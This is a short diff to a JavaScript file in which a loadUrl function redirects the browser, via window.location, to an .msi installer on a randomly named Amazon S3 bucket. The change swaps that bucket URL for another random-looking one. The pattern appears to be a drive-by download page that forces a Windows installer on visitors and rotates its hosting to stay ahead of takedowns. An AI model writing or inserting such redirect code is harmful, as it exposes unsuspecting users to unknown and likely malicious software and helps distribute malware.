@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://fhuo11yood.s3.ap-southeast-2.amazonaws.com/fhuo11yood.msi";
+		var url="https://huo1w1ocb.s3.ap-southeast-1.amazonaws.com/huo1w1ocb.msi";
 		window.location=url;
 	}
 }
@@ -13,3 +13,4 @@ function getLoad()
 	num++;
 
 }
+
